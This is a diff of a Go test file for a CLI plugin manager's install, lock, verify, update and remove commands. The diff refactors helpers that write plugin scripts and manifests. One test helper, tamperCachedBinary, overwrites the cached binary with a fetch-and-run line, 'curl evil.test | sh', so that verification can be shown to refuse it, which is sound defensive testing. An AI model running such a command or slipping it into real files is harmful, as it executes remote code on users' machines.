@@ -62,12 +62,16 @@ func pluginStub(t *testing.T) string {
 	return string(body)
 }
 
-const pluginScript = `manifest emit {"v":1,"id":"$ID","ok":true,"manifest":{"name":"linear","kind":"source",` +
-	`"api_version":1,"summary":"a scripted external source","capabilities":{"embed":false,"complete":false,` +
-	`"repo_remotes":false},"fields":[],"secrets":[]}}
+var pluginScript = manifestScript(`{"name":"linear","kind":"source","api_version":1,` +
+	`"summary":"a scripted external source","capabilities":{"embed":false,"complete":false,` +
+	`"repo_remotes":false},"fields":[],"secrets":[]}`)
+
+func manifestScript(manifest string) string {
+	return `manifest emit {"v":1,"id":"$ID","ok":true,"manifest":` + manifest + `}
 
 shutdown emit {"v":1,"id":"$ID","ok":true}
 `
+}
 
 func pythonPlugin(t *testing.T) string {
 	t.Helper()
@@ -110,32 +114,39 @@ func trustFakeReleases(t *testing.T, certificate *x509.Certificate) {
 	t.Cleanup(func() { transport.TLSClientConfig = previous })
 }
 
-func publishPlugin(t *testing.T, fake *plugindisttest.GitHub, tag, body string) {
+func publishPlugin(t *testing.T, fake *plugindisttest.GitHub, tag, body, script string) {
 	t.Helper()
 
 	fake.Publish(tag, map[string][]byte{
 		fake.AssetName(tag): plugindisttest.Archive(t, pluginBinaryName(), []byte(body)),
 	})
 
-	dir := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", tag)
+	writePluginScript(t, tag, script)
+}
+
+func writePluginScript(t *testing.T, tag, body string) {
+	t.Helper()
+
+	dir := installedPluginDir(tag)
 	if err := os.MkdirAll(dir, 0o755); err != nil {
 		t.Fatalf("make room for the plugin script: %v", err)
 	}
-	if err := os.WriteFile(filepath.Join(dir, "script.txt"), []byte(pluginScript), 0o600); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "script.txt"), []byte(body), 0o600); err != nil {
 		t.Fatalf("write the plugin script: %v", err)
 	}
+}
+
+func installedPluginDir(tag string) string {
+	return filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", tag)
 }
 
 func breakPluginScript(t *testing.T, tag string) {
 	t.Helper()
 
-	script := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", tag, "script.txt")
-	if err := os.WriteFile(script, []byte("manifest exit 1\n"), 0o600); err != nil {
-		t.Fatalf("rewrite the plugin script: %v", err)
-	}
+	writePluginScript(t, tag, "manifest exit 1\n")
 }
 
-func capturedManifest(t *testing.T, dir string) lore.Manifest {
+func capturedManifestPath(t *testing.T, dir string) string {
 	t.Helper()
 
 	var record struct {
@@ -147,9 +158,14 @@ func capturedManifest(t *testing.T, dir string) lore.Manifest {
 	if record.Manifest == "" {
 		t.Fatal("the install record names no manifest file")
 	}
+	return filepath.Join(dir, record.Manifest)
+}
+
+func capturedManifest(t *testing.T, dir string) lore.Manifest {
+	t.Helper()
 
 	var manifest lore.Manifest
-	if err := json.Unmarshal([]byte(readConfigFile(t, filepath.Join(dir, record.Manifest))), &manifest); err != nil {
+	if err := json.Unmarshal([]byte(readConfigFile(t, capturedManifestPath(t, dir))), &manifest); err != nil {
 		t.Fatalf("decode the captured manifest: %v", err)
 	}
 	return manifest
@@ -199,7 +215,7 @@ func lockFile(t *testing.T, configPath string) string {
 func tamperCachedBinary(t *testing.T) {
 	t.Helper()
 
-	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
+	binary := filepath.Join(installedPluginDir("v0.3.1"), pluginBinaryName())
 	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
 		t.Fatalf("rewrite the cached binary: %v", err)
 	}
@@ -226,7 +242,7 @@ func countRequests(t *testing.T) *countingTransport {
 
 func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	res := run(t, nil, "plugin", "install", "--config", path)
@@ -260,7 +276,7 @@ func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
 		t.Fatalf("install rewrote a pinned configuration:\n%s", config)
 	}
 
-	dir := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1")
+	dir := installedPluginDir("v0.3.1")
 	stored, reported := capturedManifest(t, dir), reportedManifest(t, filepath.Join(dir, pluginBinaryName()))
 	if !reflect.DeepEqual(stored, reported) {
 		t.Fatalf("captured manifest = %+v, want what the binary reports: %+v", stored, reported)
@@ -270,8 +286,8 @@ func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
 
 func TestPluginInstallLatestWritesTheVersionBack(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
-	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n")
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
+	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n", pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	res := run(t, nil, "plugin", "install", "linear@latest", "--config", path)
@@ -306,14 +322,14 @@ func TestPluginInstallRefusesAFloatingConfiguration(t *testing.T) {
 
 func TestPluginInstallLatestRefusesAnOriginOnlyTheLockDisagreesWith(t *testing.T) {
 	locked := newFakeReleases(t)
-	publishPlugin(t, locked, "v0.3.1", pluginStub(t))
+	publishPlugin(t, locked, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
 		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
 	}
 
 	drifted := plugindisttest.NewGitHub(t, "acme", "lore-linear")
-	publishPlugin(t, drifted, "v0.3.1", pluginStub(t)+"# acme\n")
+	publishPlugin(t, drifted, "v0.3.1", pluginStub(t)+"# acme\n", pluginScript)
 	trustFakeReleases(t, drifted.Certificate())
 	t.Setenv(plugindist.APIBaseEnv, drifted.URL)
 	if err := os.WriteFile(path, []byte(declaredConfig("github.com/acme/lore-linear@v0.3.1")), 0o600); err != nil {
@@ -356,7 +372,7 @@ func TestPluginInstallLatestRefusesAnOriginOnlyTheLockDisagreesWith(t *testing.T
 
 func TestPluginInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	declared := declaredConfig("github.com/jdoe/lore-linear@v9.9.9")
 	path := writeConfigFile(t, declared)
 
@@ -405,7 +421,7 @@ func TestPluginInstallPrintsNoURLCredentials(t *testing.T) {
 
 func TestPluginInstallCoordinateDeclaresThePlugin(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, "workspace: myproject\n")
 
 	res := run(t, nil, "plugin", "install", "github.com/jdoe/lore-linear@v0.3.1", "--config", path)
@@ -448,7 +464,7 @@ func TestPluginInstallUnnameableCoordinatePrintsNoURLCredentials(t *testing.T) {
 
 func TestPluginVerifyReportsTheDigestAndCertifiesTheBinary(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pythonPlugin(t))
+	publishPlugin(t, fake, "v0.3.1", pythonPlugin(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
@@ -474,7 +490,7 @@ func TestPluginVerifyReportsTheDigestAndCertifiesTheBinary(t *testing.T) {
 
 func TestPluginInstallRefusesABinaryThatIsNotAPlugin(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", "#!/bin/sh\necho lore-linear\n")
+	publishPlugin(t, fake, "v0.3.1", "#!/bin/sh\necho lore-linear\n", pluginScript)
 	declared := declaredConfig("github.com/jdoe/lore-linear@v0.3.1")
 	path := writeConfigFile(t, declared)
 
@@ -497,7 +513,7 @@ func TestPluginInstallRefusesABinaryThatIsNotAPlugin(t *testing.T) {
 
 func TestPluginVerifyReportsTheDigestWhenCertificationRefuses(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
@@ -516,7 +532,7 @@ func TestPluginVerifyReportsTheDigestWhenCertificationRefuses(t *testing.T) {
 
 func TestPluginVerifyRefusesARewrittenCachedBinary(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
@@ -536,13 +552,13 @@ func TestPluginVerifyRefusesARewrittenCachedBinary(t *testing.T) {
 
 func TestPluginUpdateRewritesTheLockedDigest(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
 		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
 	}
-	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n")
+	publishPlugin(t, fake, "v0.4.0", pluginStub(t)+"# v0.4.0\n", pluginScript)
 
 	res := run(t, nil, "plugin", "update", "linear", "--config", path)
 	if res.exitCode != exitOK {
@@ -563,7 +579,7 @@ func TestPluginUpdateRewritesTheLockedDigest(t *testing.T) {
 
 func TestPluginRemoveDropsTheDeclarationLockAndCache(t *testing.T) {
 	fake := newFakeReleases(t)
-	publishPlugin(t, fake, "v0.3.1", pluginStub(t))
+	publishPlugin(t, fake, "v0.3.1", pluginStub(t), pluginScript)
 	path := writeConfigFile(t, declaredConfig("github.com/jdoe/lore-linear@v0.3.1"))
 
 	if res := run(t, nil, "plugin", "install", "--config", path); res.exitCode != exitOK {
